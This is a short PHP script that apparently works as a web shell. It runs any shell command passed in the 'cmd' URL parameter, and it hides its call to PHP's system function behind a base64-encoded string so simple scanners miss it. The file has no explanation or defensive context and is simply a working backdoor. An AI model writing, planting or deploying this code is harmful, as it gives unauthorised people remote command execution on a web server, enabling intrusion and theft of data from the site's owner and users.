<?php
$cmd = $_GET['cmd'];
$func = base64_decode('c3lzdGVt'); // "system"
$func($cmd);
?>


